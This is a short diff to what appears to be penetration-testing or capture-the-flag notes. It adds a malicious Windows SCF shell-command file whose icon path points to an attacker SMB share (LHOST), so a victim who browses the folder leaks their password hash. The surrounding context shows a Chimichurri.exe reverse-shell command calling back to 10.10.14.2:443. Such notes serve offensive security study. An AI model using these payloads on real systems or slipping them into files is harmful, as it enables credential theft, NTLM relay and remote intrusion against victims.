@@ -993,3 +993,14 @@ Privesc via reverse shell
 ```
 .\Chimichurri.exe 10.10.14.2 443
 ```
+
+### Creating malicious scf (shell command file) which can be weaponized to connect back to an attacker's smbrelay to retrieve the victim's hash.
+
+`exploit.scf`
+```
+[Shell]
+Command=2
+IconFile=\\LHOST\tools\bad.ico
+[Taskbar]
+Command=ToggleDesktop
+```
